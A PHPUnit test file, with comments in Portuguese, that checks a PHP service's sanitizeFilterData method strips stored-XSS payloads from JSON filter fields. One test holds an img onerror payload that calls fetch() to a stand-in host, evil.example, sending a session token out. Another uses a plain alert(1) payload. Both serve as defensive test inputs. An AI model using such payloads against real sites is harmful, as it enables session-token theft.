<?php

namespace Tests\Unit;

use App\Api\Services\PvService;
use PHPUnit\Framework\TestCase;

/**
 * Sanitizacao de filtro_data (stored XSS via campos "numericos" do JSON).
 * Regra: campos numericos viram float; tamanho vira string limpa; JSON invalido vira null.
 */
class PvServiceFilterDataTest extends TestCase
{
    public function testNullStaysNull(): void
    {
        $this->assertNull(PvService::sanitizeFilterData(null));
    }

    public function testEmptyStringStaysNull(): void
    {
        $this->assertNull(PvService::sanitizeFilterData(''));
    }

    public function testInvalidJsonBecomesNull(): void
    {
        $this->assertNull(PvService::sanitizeFilterData('not-json'));
    }

    public function testNonArrayJsonBecomesNull(): void
    {
        $this->assertNull(PvService::sanitizeFilterData('"just-a-string"'));
    }

    public function testValidFilterDataKeepsNumericValues(): void
    {
        $input = json_encode([
            'tamanho' => '850x636',
            'qtd_pecas' => 3,
            'area_placa' => 0.5386,
            'area_plana_total' => 1.6158,
            'qtd_cobrar' => 3,
        ]);

        $result = json_decode(PvService::sanitizeFilterData($input), true);

        $this->assertSame('850x636', $result['tamanho']);
        $this->assertSame(3.0, $result['qtd_pecas']);
        $this->assertSame(0.5386, $result['area_placa']);
        $this->assertSame(1.6158, $result['area_plana_total']);
        $this->assertSame(3.0, $result['qtd_cobrar']);
    }

    public function testXssPayloadInNumericFieldsIsNeutralized(): void
    {
        $payload = '<img src=x onerror="fetch(\'https://evil.example/\'+sessionStorage.getItem(\'rubble_token\'))">';
        $input = json_encode([
            'tamanho' => $payload,
            'qtd_pecas' => $payload,
            'area_placa' => $payload,
            'area_plana_total' => $payload,
            'qtd_cobrar' => $payload,
        ]);

        $sanitized = PvService::sanitizeFilterData($input);
        $result = json_decode($sanitized, true);

        // Numericos: payload vira 0.0 (inofensivo no HTML e no e-mail)
        $this->assertSame(0.0, $result['qtd_pecas']);
        $this->assertSame(0.0, $result['area_placa']);
        $this->assertSame(0.0, $result['area_plana_total']);
        $this->assertSame(0.0, $result['qtd_cobrar']);

        // Tamanho: tags removidas
        $this->assertStringNotContainsString('<', $result['tamanho']);
        $this->assertStringNotContainsString('>', $result['tamanho']);
        $this->assertStringNotContainsString('"', $result['tamanho']);
    }

    public function testTamanhoIsTruncatedTo64Chars(): void
    {
        $input = json_encode(['tamanho' => str_repeat('a', 200)]);
        $result = json_decode(PvService::sanitizeFilterData($input), true);

        $this->assertLessThanOrEqual(64, strlen($result['tamanho']));
    }

    public function testSaveSanitizesItemFilterData(): void
    {
        $payload = '<img src=x onerror=alert(1)>';
        $item = [
            'pv_id' => 1,
            'lpu_origem' => 'material_clima',
            'descricao_lpu' => 'Filtro',
            'descricao' => 'Filtro',
            'numero_item' => 1,
            'quantidade' => 1,
            'valor' => 10,
            'valor_total' => 10,
            'bdi' => 0,
            'valor_flpu' => 0,
            'fatura' => 'flpu',
            'scm' => null,
            'laudo' => null,
            'status' => 'Pendente',
            'orcamento' => null,
            'filtro_data' => json_encode([
                'tamanho' => $payload,
                'qtd_pecas' => $payload,
                'area_placa' => 1.0,
                'area_plana_total' => 2.0,
                'qtd_cobrar' => $payload,
            ]),
        ];

        $repo = $this->createMock(\App\Api\Repositories\PvRepository::class);
        $repo->expects($this->once())->method('beginTransaction');
        $repo->expects($this->once())->method('commit');
        $repo->method('save')->willReturn(10);
        $repo->method('getWorstStatus')->willReturn('Pendente');
        $repo->method('saveItem')->with($this->callback(function ($saved) {
            $fd = json_decode($saved['filtro_data'], true);
            return is_array($fd)
                && $fd['qtd_pecas'] === 0.0
                && $fd['qtd_cobrar'] === 0.0
                && !str_contains($fd['tamanho'], '<');
        }));

        $service = new PvService($repo, $this->createMock(\App\Api\Services\TicketService::class));
        $service->save(['itens' => [$item], 'os' => '']);
    }
}
